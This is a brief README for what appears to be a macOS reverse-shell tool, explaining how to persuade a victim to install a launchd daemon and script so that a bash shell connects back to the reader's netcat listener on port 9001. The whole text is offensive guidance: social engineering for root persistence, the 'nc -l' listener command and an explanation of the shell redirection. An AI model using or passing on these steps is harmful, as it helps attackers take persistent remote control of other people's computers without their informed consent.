**To "install"**

Convince the user to get the launchd job into /Library/LaunchDaemons, and place the script into /usr/local/bin.

**How to "Use"**
On your local system, open terminal and type "nc -l 9001" and press enter.
In another terminal window, execute the script (./remoteshell). Your netcat window will sudden pop through a shell for you!

**Why it works**
netcat simply listens for any network connection of any type and echos it into your terminal. The bash snippet is simply redirecting a shell through the TCP connection over to netcat.

